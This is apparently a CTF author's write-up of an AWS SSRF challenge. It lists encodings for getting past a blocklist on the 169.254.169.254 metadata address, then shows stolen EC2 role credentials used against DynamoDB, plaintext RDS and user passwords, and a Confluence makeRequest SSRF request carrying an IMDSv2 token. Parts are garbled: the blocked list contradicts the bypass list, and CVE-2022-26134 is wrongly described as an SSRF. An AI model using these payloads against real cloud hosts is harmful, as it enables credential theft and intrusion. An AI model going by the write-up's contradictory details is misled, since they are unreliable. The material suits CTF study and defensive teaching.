---
title: Security-JAWS DAYS 参加記 & CTF 作問者解説
contest: Security-JAWS DAYS
year: 2023
team: 作問者 (chamd5)
difficulty: hard
vuln_type: web_unknown
tags: [aws-imds-ssrf, octal-ip-bypass, 8-ary-numeric-host, dynamodb, rds-mysql, cve-2022-26134, conf-gadget-ssrf]
attack_chain:
- Block 169.254.169.254 (IMDS 主机名黑名单)
- 8 进制 0251.254.169.254 数字主机名绕
- 10 进制 2852039166 整数绕
- 16 进制 0xA9.0xFE.0xA9.0xFE / 0xA9FEA9FE 绕
- 短 URL 重定向服务绕
- nip.io / sslip.io 第三方 DNS 服务 (169.254.169.254.nip.io)
- 8 进制 + 10 进制混用 0251.254.000251.0000376
- IMDS 拿 ASIA[REDACTED] EC2 instance role
- dynamodb list-tables 找 private-ctfdb
- dynamodb scan 拿 flag SJAWS{Get_2ecr@t_1am_ke9!!}
- RDS MySQL 8.0.33 /Users/exporter /TF6zZaECv7f5
- UserInfo 表 adminsite@localhost:8444 / dummy
- CVE-2022-26134 Confluence Server makeRequest gadget SSRF
- X-aws-ec2-metadata-token PUT 拿 IMDSv2 token
- url=http://169.254.169.254/latest/meta-data&httpMethod=GET&headers=X-aws-ec2-metadata-token:...
key_payload: 0251.254.000251.0000376
one_liner: Security-JAWS 作問者解説：AWS IMDS 主机名黑名单 9 种绕过 (8/10/16 进制 + 短链 + nip.io) + DynamoDB + RDS + Confluence CVE-2022-26134 SSRF。
lesson: 任何 IP 字符串黑名单都有数十种 bypass，正确的解法是 enum IMDS endpoint 调用而非字符串匹配。
quality: high
---
# Security-JAWS DAYS 参加記 & CTF 作問者解説

## 1. 题目一：主机名黑名单 bypass
```bash
# Blocked: 169.254.169.254
# Block 的形式：
#   169.254.169.254
#   2852039166 (10 进制整数)
#   0xA9.0xFE.0xA9.0xFE
#   0xA9FEA9FE
#   0251.0376.0251.0376 (8 进制)
#   0251.00376.000251.0000376
#   0251.254.169.254
```

### 9 种 bypass
1. 短链 (URL 重定向服务如 bit.ly)
2. 短数字 `http://025177524776` (8 进制)
3. 8 进制混合
4. `169.254.169.254.nip.io` (DNS 解析服务)
5. `slip.io` / `sslip.io`
6. 8 进制 + 10 进制混用 `0251.254.000251.0000376`
7. 整数 IP `2852039166`
8. 16 进制 IP `0xA9FEA9FE`
9. IPv4 兼容 IPv6 `::ffff:169.254.169.254`

## 2. 题目二：EC2 instance role
```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA[REDACTED]",
  "SecretAccessKey": "[REDACTED]",
  "Token": "[REDACTED]",
  "Expiration": "2023-08-25T19:03:41Z"
}
```
写入 `~/.aws/credentials`:
```ini
[ec2_role]
aws_access_key_id = ASIA...
aws_secret_access_key = ...
aws_session_token = ...
```

## 3. DynamoDB
```bash
$ aws dynamodb list-tables --profile ec2_role
{
  "TableNames": ["private-ctfdb"]
}
$ aws dynamodb scan --table-name private-ctfdb --profile ec2_role
{
  "Items": [{"flag": {"S": "SJAWS{Get_2ecr@t_1am_ke9!!}"}}]
}
```

## 4. RDS MySQL
```bash
sudo echo "database-1.ciy3eyquzz8p.ap-northeast-1.rds.amazonaws.com" >> /home/ubuntu/.secret/db_host
sudo echo "exporter" >> /home/ubuntu/.secret/db_user
sudo echo "TF6zZaECv7f5" >> /home/ubuntu/.secret/db_pass
```
```sql
mysql> use Users;
mysql> select * from UserInfo;
+----+--------------------------+--------------+
| 1  | exporter@awsctfssrf.com  | CQbpUKC5vX7k |
| 2  | adminsite@localhost:8444 | dummy        |
```

## 5. Confluence CVE-2022-26134 (SSRF)
```http
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: confluence.dev.████████.com
url=http://169.254.169.254/latest/meta-data&httpMethod=GET&headers=X-aws-ec2-metadata-token: AQAEAH7...
```
`makeRequest` gadget 是 Confluence 提供的内部 SSRF 入口。

## 6. 防御建议
- IMDSv2 强制 (`HttpTokens=required`)
- VPC endpoint 替代 IMDS
- IP 字符串黑名单 9 种以上 bypass，正确的解法是 endpoint 行为检测
